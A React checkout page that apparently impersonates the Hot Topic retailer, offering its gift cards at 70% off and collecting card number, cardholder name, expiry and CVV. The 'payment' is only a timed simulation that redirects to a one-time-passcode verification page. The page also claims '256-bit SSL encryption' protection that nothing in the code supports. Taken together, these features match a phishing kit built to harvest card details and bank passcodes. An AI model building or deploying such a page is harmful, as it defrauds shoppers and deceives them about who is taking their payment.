import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "@/hooks/use-toast";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicFooter from "@/components/HotTopicFooter";
import { AlertCircle, CreditCard, LockIcon, Shield } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

// Updated card types with SVG content
const CARD_TYPES = [
  { 
    name: "Visa", 
    icon: (
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="24" viewBox="0 0 750 471">
        <rect width="750" height="471" fill="#0066b2" rx="40"/>
        <polygon fill="#fff" points="278.2,334.1 311.9,138.9 364.1,138.9 330.3,334.1"/>
        <path fill="#fff" d="M524.3,142.7c-12.2-4.6-31.3-9.6-55-9.6c-60.5,0-103.1,30.6-103.5,74.5c-0.4,32.4,30.4,50.5,53.7,61.3c23.8,11,31.8,18.1,31.7,27.9c-0.2,15.1-19,22-36.6,22c-24.4,0-37.4-3.4-57.4-11.8l-7.8-3.5l-8.6,50.1c14.2,6.3,40.6,11.7,68,12c64.1,0,105.8-30.2,106.3-77.1c0.3-25.7-16.1-45.3-51.7-61.5c-21.5-10.5-34.7-17.5-34.6-28.1c0.1-9.4,11.1-19.5,35.1-19.5c20-0.3,34.6,4,45.9,8.7l5.5,2.6L524.3,142.7"/>
        <path fill="#fff" d="M661.5,138.9h-44.8c-13.6,0.1-23.9,3.8-29.9,17.4l-84.8,177.8h60l12-32.8l72.7,0.1l7,32.7h53L661.5,138.9 M583.4,262.5c2-5.5,25.3-65.9,25.3-65.9c-0.4,0.6,5.2-13.4,8.4-22.1l4.3,20c0,0,12.1,55.7,14.7,68.1L583.4,262.5z"/>
        <path fill="#fff" d="M204,138.9l-56.1,143l-6-29.5c-10.4-33.8-43-70.5-79.5-88.9l51.4,183.6l60.7-0.1l90.5-208.2L204,138.9"/>
        <path fill="#f2ae14" d="M131.9,138.9H40.6l-0.8,4.6c70.9,17.2,117.8,58.7,137.3,108.6l-19.8-95.5C154,143.5,144.4,139.5,131.9,138.9"/>
      </svg>
    )
  },
  { 
    name: "Mastercard", 
    icon: (
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="24" viewBox="0 0 750 471">
        <rect width="750" height="471" fill="#16366f" rx="40"/>
        <path d="M221.13 421.67v-33.94c0-12.86-7.96-21.53-21.06-21.53-6.62 0-13.96 2.33-19.07 9.12-3.76-6.03-9.4-9.12-17.84-9.12-5.73 0-11.46 1.74-16.01 7.6v-6.37h-11.75v54.24h11.84v-30.08c0-9.4 5.25-14.35 13.34-14.35 7.96 0 11.84 5.25 11.84 14.18v30.25h11.84v-30.08c0-9.4 5.43-14.35 13.34-14.35 8.14 0 11.84 5.25 11.84 14.18v30.25h11.69zm176.35-54.24h-19.24v-16.42h-12.02v16.42h-10.42v10.69h10.42v24.85c0 11.84 4.54 19.07 17.58 19.07 4.84 0 10.34-1.49 13.96-3.76l-3.23-10.16c-3.23 1.91-7 2.67-9.83 2.67-5.43 0-6.45-3.39-6.45-8.47v-24.19h19.24v-10.69zm100.14-1.23c-6.7 0-11.08 3.14-13.96 7.6v-6.37h-11.67v54.24h11.75v-30.42c0-8.82 3.76-13.96 11.08-13.96 2.33 0 5.31.41 7.6 1.16l3.39-11.17c-2.37-.67-5.43-1.08-8.14-1.08h-.04zm-65.8 28.09c0 16.42 11.67 28.09 29.5 28.09 8.4 0 14.01-1.83 20.05-6.62l-5.96-9.99c-4.96 3.56-10.16 5.31-15.59 5.31-10.34 0-16.83-7.6-16.83-16.79s6.49-16.67 16.83-16.67c5.43 0 10.63 1.83 15.59 5.31l5.96-9.99c-6.03-4.79-11.67-6.62-20.05-6.62-17.83 0-29.5 11.67-29.5 28.09v-.11zm112.34-28.09c-16.26 0-27.65 11.84-27.65 28.09 0 16.96 12.06 28.09 28.4 28.09 8.23 0 16.01-2.08 22.71-6.95l-5.89-8.89c-4.63 3.39-10.42 5.31-16.18 5.31-7.76 0-14.93-3.56-16.59-13.47h41.69v-4.67c.41-17.75-9.99-27.52-26.45-27.52h-.04zm.17 9.49c7.84 0 13.39 4.96 14.76 13.47h-30.17c1.33-8.06 6.7-13.47 15.42-13.47zm-258.52 18.6c0 16.42 11.67 28.09 29.5 28.09 8.4 0 14.01-1.83 20.05-6.62l-5.96-9.99c-4.96 3.56-10.16 5.31-15.59 5.31-10.34 0-16.83-7.6-16.83-16.79s6.49-16.67 16.83-16.67c5.43 0 10.63 1.83 15.59 5.31l5.96-9.99c-6.03-4.79-11.67-6.62-20.05-6.62-17.91 0-29.5 11.67-29.5 28.09v-.11zm281.81-27.36h-.15c-5.96-1.24-12.65.5-15.88 7.93v-6.7h-11.67v54.24h11.75v-29.84c0-11.34 6.7-15.92 17.58-14.35v-11.3zm-109.03-.17c-16.26 0-27.65 11.84-27.65 28.09 0 16.96 12.06 28.09 28.4 28.09 8.23 0 16.01-2.08 22.71-6.95l-5.89-8.89c-4.63 3.39-10.42 5.31-16.18 5.31-7.76 0-14.93-3.56-16.59-13.47h41.69v-4.67c.41-17.75-9.99-27.52-26.45-27.52h-.04zm.17 9.49c7.84 0 13.39 4.96 14.76 13.47h-30.17c1.33-8.06 6.7-13.47 15.42-13.47z" fill="#fff"/>
        <circle cx="382.5" cy="196.2" r="128" fill="#d9222a"/>
        <path d="M309.2 196.2a128 128 0 01128-128 128 128 0 0127.5 3c-22 9.3-37.3 31-37.3 56.4 0 33.8 27.4 61.3 61.3 61.3 25.4 0 47.1-15.4 56.4-37.3a128 128 0 013 27.5 128 128 0 01-128 128 128 128 0 01-111-64.1 128 128 0 010-127.7 128 128 0 110.1-19.1z" fill="#ee9f2d"/>
      </svg>
    )
  },
  { 
    name: "American Express", 
    icon: (
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="24" viewBox="0 0 750 471">
        <rect width="750" height="471" fill="#2557D6" rx="40"/>
        <path d="M48 295.9h36.6l8.2-19.7h18.5L119.4 296h112.5v-15.2l10 15.2h59.3l10-15.4V296h242l28-31.4L610.3 296h72.5l.1-63.8h-71.8L583.2 264l-29.4-31.8h-115v-15.4l-8.2 15.4h-63.9l-7.8-17.9h-19.5l-7.7 18v-18h-59.1l-7 15.4-6.9-15.4h-81v123.6h79.5l7.5-16 7.2 16h61.8v-18.6l10.2 18.6h54.2v-99.7l25.7 99.7h27.6l25.9-99.7V296h54.1v-31.8h10.2c5.1 0 6.3.2 6.3 7.9v24H517V232s17.7-.7 27 25.4c0 0 3.9 11.5 25 38.4V232H631v9.7L600.3 203l30.7-31.5v9.2h181V173L829.4 185l18-3.3v114.3h-19V182.2l-22.4 3.9-22.9-3.9v113.8H263l-13.3-15h-39.4l-12.6 15H48v-63.8l25.3-27.3 26.6 27.3v63.8zM640 152H0v218h640V152z" fill="#fff"/>
        <path d="M107.3 250l27.5-64.1h21.9L184.3 250v64.1h27.5L197 276h47.5l14.8 38h31.2l-64.1-152.1h-27.5L126.6 314h29.4v-64.1h-.1l21.9-50.2-11 25.7-14.8 38.4h-45.7v-13.8zm192.3-50.2v75.8l-21.9-49.2v73.1h-27.5v-48.4l-17.5 48.4h-18.4l-17.5-48.4v48.4h-38.5l-7.3-17.5h-40.3l-7.3 17.5H82.4l34.9-80.4h29.4l33 77.7v-77.7h32.1l25.7 54.7 23.9-54.7h32.1v.3zm49.2-25.7v152.2h87.7v-29.4h-59.3v-32.1h58.4V236h-58.4v-32.1h59.3v-29.4l-87.7-.4zm128 123.5c12 6.4 31.2 11.9 50.2 11.9 18.1 0 27.9-7.2 27.9-17.4 0-11-6.6-16.2-23.9-23.3-24.4-10.1-43.3-24.7-43.3-48.8 0-27.5 23.2-48.7 60.3-48.7 17.1 0 30.2 3.7 39.4 8.2l-9.6 25.6c-6.1-3.1-17.6-7.7-30.7-7.7-17.5 0-25.7 8.4-25.7 16.4 0 11 7.9 15.4 26.6 23.9 25.1 11.1 40.7 25.8 40.7 48.8 0 27-20.2 49.6-63.9 49.6-18.4 0-36.2-5.1-45.5-10l9.5-28.5z" fill="#2557D6"/>
        <path d="M303.8 38.9v152.1h87.7v-29.4h-59.3v-32.1h58.4V100h-58.4V67.9h59.3V38.5h-87.7zm-139.2 0l-45.8 115.6L73.6 38.9H37.2v124.8l-50.5-124.8H-35l-53.8 152.1h32.7l11.8-33h63.9l11.8 33h34L46 152.8V38.9h26.1l28.3 67.6c6.6 15.8 12 33.5 16.5 49h.9c4.5-17.1 8.9-33.2 15.5-49l27.8-67.6h26.5zm-89.5 90.4l9.1-27.6c4.6-14.8 9.1-29.9 13.6-45h.9c4.5 15 9.1 30.3 13.6 45l9.1 27.6h-46.3z" fill="#fff"/>
        <path d="M517 38.9v152.1h-29.4V67.9h-41.2V38.5L517 38.9zM376.9 106c0 39.4-16.9 57.3-45.6 57.3s-44.7-21-44.7-56.4c0-36.7 17.7-56.5 45.6-56.5 27.6 0 44.7 20.2 44.7 55.6zm-58.2 .9c0 23.9 6.7 33 13.6 33 6.7 0 13.5-9.1 13.5-33 0-21.9-5.6-32.9-13.5-32.9-8.2 0-13.6 11-13.6 32.9zm215.3-68v27.4h-38.5v32.1h36.7v27.5h-36.7v32.1h40.9v29.4h-70.4V38.9h68zm35.7 0c14.6 0 29.3 3.5 38.8 9.1L599 72.5c-7.6-4.6-18.4-8.4-31.2-8.4-13.9 0-20.7 4.5-20.7 11.7 0 7.5 7.6 9.5 24.4 15.2 28.5 9.3 40.3 22.8 40.3 44 0 25.6-19.7 48-61.7 48-17.3 0-35.7-4.9-47.4-11.9l9.5-27.4c10.2 6.5 25.7 12.1 40.3 12.1 15.5 0 22.8-5.3 22.8-13.1 0-7.6-5.7-10.9-20.7-16.1-29.3-9.5-43.8-23.9-43.8-43.5 0-26 20.9-45.4 60.1-45.4z" fill="#fff"/>
      </svg>
    )
  },
  { 
    name: "Discover", 
    icon: (
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="24" viewBox="0 0 780 501">
        <rect width="780" height="501" fill="#f4f4f4" rx="40"/>
        <path d="M409.4 197.9c16.5 0 31.3 8.3 31.3 30.9 0 18.5-11.9 31-31.8 31h-12.2v-61.9h12.7zm-34.1-20.7v103.9h35.2c36 0 52.5-22.4 52.5-52 0-35.5-22.4-51.9-54.4-51.9h-33.3zm397.5 103.8h21.4v-103.8h-21.4v103.8zm-360.1-82.1c11 0 17.7 7 17.7 18.2 0 11.6-6.7 18.7-17.4 18.7h-19.9v-36.9h19.6zm-41.1-21.7v103.8h21.4v-43.3h15.6c26.6 0 43.5-13.5 43.5-38.5-.5-19.6-13.6-36.4-41.7-36.4l-38.8.3v14.1zm122 0v17.7h37.3v86.2h21.4v-86.2h37.5v-17.7h-96.2zm180.8 0l-44.8 103.9h23l10.2-25h49.8l10.2 25h23.7l-44.8-103.9h-27.3zm13.9 21.8l18.4 44h-36.3l17.9-44z" fill="#4d4d4d"/>
        <path d="M531.4 350.2c-4.5-1.3-9.2-1.8-14-1.8-17.2 0-29.7 8.9-29.7 21.7 0 8.9 5.1 14.3 13.5 17.5l9.7 3.5c5.4 2.2 7.5 4 7.5 6.7 0 4-4.5 6.5-12.2 6.5-6.7 0-13.4-1.3-21.1-4.5v11.3c6 2.2 13.6 3.2 21.1 3.5 17.9 0 31.6-8.4 31.6-22.9 0-9.4-5.4-14.9-14-18.2l-9.7-3.5c-5.1-1.8-7.3-3.5-7.3-6.2 0-3.8 4.5-6 11.1-6 6.5 0 13.3 1.3 19.3 3.8l4.2-10.4z" fill="#f47216"/>
        <path d="M31.9 250.1v.2c45.4 0 90.7 0 136.1-.3 18.8 0 25.1 6.5 25.1 24.9v226c-172.4-69.9-172.4-181.3-161.2-250.8z" fill="#f47216"/>
      </svg>
    )
  }
];

// Regex patterns for validation
const CARD_NUMBER_REGEX = /^[0-9]{13,19}$/;
const CVV_REGEX = /^[0-9]{3,4}$/;
const CARD_NAME_REGEX = /^[A-Za-z\s]+$/;

// Function to validate credit card type from number
const detectCardType = (cardNumber: string): string => {
  // Remove all non-digit characters
  const number = cardNumber.replace(/\D/g, '');
  
  // Check for card type patterns
  if (number.startsWith('4')) {
    return "Visa";
  } else if (/^5[1-5]/.test(number)) {
    return "Mastercard";
  } else if (/^3[47]/.test(number)) {
    return "American Express";
  } else if (/^(6011|65|64[4-9])/.test(number)) {
    return "Discover";
  }
  
  return "Unknown";
};

const Payment = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [selectedCardType, setSelectedCardType] = useState<string>("Visa");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardName: "",
    expiryDate: "",
    cvv: ""
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Get order details from location state
  const orderDetails = location.state?.orderDetails;
  const giftCardValue = location.state?.giftCardValue;
  const discountedAmount = location.state?.discountedAmount;

  // If no order details, redirect to home
  if (!orderDetails) {
    navigate("/");
    toast({
      title: "Error",
      description: "No order information found. Please start again.",
      variant: "destructive",
    });
  }

  const validateField = (name: string, value: string): string => {
    switch (name) {
      case "cardName":
        if (value.trim() === "") return "This field is required";
        if (!CARD_NAME_REGEX.test(value)) return "Please enter a valid name";
        return "";
      case "cardNumber":
        if (!CARD_NUMBER_REGEX.test(value.replace(/\s/g, ''))) {
          return "Please enter a valid card number";
        }
        if (detectCardType(value) === "Unknown") {
          return "Unsupported card type";
        }
        return "";
      case "expiryDate":
        const [month, year] = value.split('/').map(part => part.trim());
        if (!month || !year || isNaN(Number(month)) || isNaN(Number(year))) {
          return "Please enter a valid expiry date (MM/YY)";
        }
        if (Number(month) < 1 || Number(month) > 12) {
          return "Month must be between 1 and 12";
        }
        const currentYear = new Date().getFullYear() % 100;
        const currentMonth = new Date().getMonth() + 1; // JavaScript months are 0-based
        
        if (Number(year) < currentYear || 
            (Number(year) === currentYear && Number(month) < currentMonth)) {
          return "Card has expired";
        }
        return "";
      case "cvv":
        if (!CVV_REGEX.test(value)) {
          return "Please enter a valid CVV";
        }
        // Different validation for American Express (4 digits) vs other cards (3 digits)
        if (selectedCardType === "American Express" && value.length !== 4) {
          return "American Express cards require a 4-digit CVV";
        } else if (selectedCardType !== "American Express" && value.length !== 3) {
          return "Please enter a 3-digit CVV";
        }
        return "";
      default:
        return "";
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    
    // Validate field on change and update errors
    const error = validateField(name, value);
    setErrors(prev => ({
      ...prev,
      [name]: error
    }));
  };

  const formatCardNumber = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Auto-detect card type and update state
    const detectedType = detectCardType(cleaned);
    if (detectedType !== "Unknown") {
      setSelectedCardType(detectedType);
    }
    
    // Format as XXXX XXXX XXXX XXXX (or XXXX XXXXXX XXXXX for AMEX)
    const chunks = [];
    if (detectedType === "American Express") {
      if (cleaned.length > 0) chunks.push(cleaned.substring(0, Math.min(4, cleaned.length)));
      if (cleaned.length > 4) chunks.push(cleaned.substring(4, Math.min(10, cleaned.length)));
      if (cleaned.length > 10) chunks.push(cleaned.substring(10, Math.min(15, cleaned.length)));
    } else {
      for (let i = 0; i < cleaned.length; i += 4) {
        chunks.push(cleaned.substring(i, Math.min(i + 4, cleaned.length)));
      }
    }
    return chunks.join(' ');
  };

  const formatExpiryDate = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Format as MM/YY
    if (cleaned.length >= 3) {
      return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
    } else {
      return cleaned;
    }
  };

  const handleCardNumberInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setFormData(prev => ({
      ...prev,
      cardNumber: formatted
    }));
    
    // Validate card number
    const error = validateField("cardNumber", formatted);
    setErrors(prev => ({
      ...prev,
      cardNumber: error
    }));
  };

  const handleExpiryDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    setFormData(prev => ({
      ...prev,
      expiryDate: formatted
    }));
    
    // Validate expiry date
    const error = validateField("expiryDate", formatted);
    setErrors(prev => ({
      ...prev,
      expiryDate: error
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate all required fields
    const newErrors: Record<string, string> = {};
    let hasErrors = false;
    
    // Fields to validate
    const fieldNames = ["cardNumber", "cardName", "expiryDate", "cvv"];
    
    // Validate each field
    fieldNames.forEach(fieldName => {
      const error = validateField(fieldName, formData[fieldName as keyof typeof formData]);
      if (error) {
        newErrors[fieldName] = error;
        hasErrors = true;
      }
    });
    
    setErrors(newErrors);
    
    if (hasErrors) {
      toast({
        title: "Validation Error",
        description: "Please fix the errors in the form",
        variant: "destructive",
      });
      return;
    }
    
    // Set loading state
    setIsSubmitting(true);
    
    try {
      console.log(`Processing payment for $${giftCardValue} gift card (70% off) using ${selectedCardType}`);
      
      // Create payment processing simulation
      setTimeout(() => {
        // Navigate to OTP verification page
        navigate("/otp-verification", { 
          state: { 
            orderDetails,
            giftCardValue,
            discountedAmount,
            paymentMethod: selectedCardType,
            lastFour: formData.cardNumber.slice(-4)
          } 
        });
      }, 1500);
    } catch (error) {
      console.error("Payment submission error:", error);
      toast({
        title: "System Error",
        description: "We encountered a technical issue. Please try again later.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const renderErrorMessage = (fieldName: string) => {
    if (!errors[fieldName]) return null;
    
    return (
      <div className="text-red-500 text-sm mt-1 flex items-center gap-1">
        <AlertCircle className="h-4 w-4" />
        <span>{errors[fieldName]}</span>
      </div>
    );
  };

  // Find the selected card icon
  const selectedCardIcon = CARD_TYPES.find(card => card.name === selectedCardType)?.icon;

  return (
    <div className="min-h-screen bg-black">
      <HotTopicHeader />
      
      <div className="container py-8">
        <div className="max-w-3xl mx-auto space-y-6">
          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h1 className="text-3xl font-bold text-white mb-6 text-center">
              Complete Your <span className="text-hottopic-red">Payment</span>
            </h1>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Payment Method */}
              <div className="space-y-4">
                <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                    1
                  </span>
                  Payment Method
                </h2>
                
                <div className="space-y-2">
                  <Label htmlFor="cardType" className="text-white">Card Type*</Label>
                  <div className="flex items-center gap-2">
                    <CreditCard className="h-5 w-5 text-hottopic-red" />
                    <Select
                      value={selectedCardType}
                      onValueChange={(value) => setSelectedCardType(value)}
                    >
                      <SelectTrigger 
                        className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red w-full sm:w-auto"
                        id="cardType"
                      >
                        <SelectValue placeholder="Select card type">
                          <div className="flex items-center gap-2">
                            {selectedCardIcon}
                            <span>{selectedCardType}</span>
                          </div>
                        </SelectValue>
                      </SelectTrigger>
                      <SelectContent className="bg-hottopic-dark border-hottopic-gray">
                        {CARD_TYPES.map((card) => (
                          <SelectItem 
                            key={card.name} 
                            value={card.name}
                            className="text-white hover:bg-hottopic-gray/30 focus:bg-hottopic-gray/30"
                          >
                            <div className="flex items-center gap-2">
                              {card.icon}
                              {card.name}
                            </div>
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </div>
              
              {/* Card Details */}
              <div className="space-y-4">
                <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                    2
                  </span>
                  Card Details
                </h2>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="cardNumber" className="text-white">Card Number*</Label>
                    <div className="relative">
                      <Input
                        id="cardNumber"
                        name="cardNumber"
                        value={formData.cardNumber}
                        onChange={handleCardNumberInput}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red pl-9 font-mono ${errors.cardNumber ? 'border-red-500' : ''}`}
                        placeholder="•••• •••• •••• ••••"
                        maxLength={selectedCardType === "American Express" ? 17 : 19}
                      />
                      <div className="absolute left-3 top-2.5 h-4 w-4 text-gray-400">
                        {selectedCardIcon ? (
                          <div className="scale-[0.6] -ml-1 -mt-1">{selectedCardIcon}</div>
                        ) : (
                          <CreditCard className="h-4 w-4" />
                        )}
                      </div>
                    </div>
                    {renderErrorMessage("cardNumber")}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cardName" className="text-white">Name on Card*</Label>
                    <Input
                      id="cardName"
                      name="cardName"
                      value={formData.cardName}
                      onChange={handleInputChange}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cardName ? 'border-red-500' : ''}`}
                      placeholder="Enter name as it appears on card"
                    />
                    {renderErrorMessage("cardName")}
                  </div>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate" className="text-white">Expiry Date*</Label>
                    <Input
                      id="expiryDate"
                      name="expiryDate"
                      value={formData.expiryDate}
                      onChange={handleExpiryDateInput}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.expiryDate ? 'border-red-500' : ''}`}
                      placeholder="MM/YY"
                      maxLength={5}
                    />
                    {renderErrorMessage("expiryDate")}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-white">Security Code (CVV)*</Label>
                    <div className="relative">
                      <Input
                        id="cvv"
                        name="cvv"
                        value={formData.cvv}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cvv ? 'border-red-500' : ''}`}
                        placeholder={selectedCardType === "American Express" ? "••••" : "•••"}
                        maxLength={selectedCardType === "American Express" ? 4 : 3}
                        type="password"
                      />
                      <div className="absolute right-3 top-2.5 h-4 w-4 text-gray-400">
                        <LockIcon size={16} />
                      </div>
                    </div>
                    {renderErrorMessage("cvv")}
                  </div>
                </div>
              </div>
              
              {/* Order Summary */}
              <div className="bg-hottopic-gray/20 p-6 rounded-lg border border-hottopic-gray/30 space-y-4">
                <h3 className="text-xl font-semibold text-white mb-2">Order Summary</h3>
                
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Item:</span>
                    <span className="text-white">Hot Topic Gift Card</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Gift Card Value:</span>
                    <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Discount:</span>
                    <span className="text-hottopic-red">70% OFF</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Delivery Method:</span>
                    <span className="text-white capitalize">{orderDetails?.deliveryMethod}</span>
                  </div>
                  <div className="border-t border-hottopic-gray/30 my-2 pt-2 flex justify-between font-bold">
                    <span className="text-white">Total:</span>
                    <span className="text-hottopic-red">${discountedAmount?.toFixed(2) || "0.00"}</span>
                  </div>
                </div>
              </div>
              
              {/* Submit Button */}
              <div className="flex justify-center">
                <Button 
                  type="submit" 
                  disabled={isSubmitting}
                  className="w-full md:w-auto px-8 py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
                >
                  {isSubmitting ? (
                    <div className="flex items-center space-x-2">
                      <div className="w-5 h-5 border-2 border-t-transparent border-white rounded-full animate-spin"></div>
                      <span>Processing...</span>
                    </div>
                  ) : (
                    "Complete Purchase"
                  )}
                </Button>
              </div>
              
              <div className="flex items-center justify-center text-center">
                <Shield size={16} className="text-gray-400 mr-2" />
                <p className="text-gray-400 text-sm">
                  Secure checkout - Your information is protected with 256-bit SSL encryption
                </p>
              </div>
            </form>
          </div>
        </div>
      </div>
      
      <HotTopicFooter />
    </div>
  );
};

export default Payment;
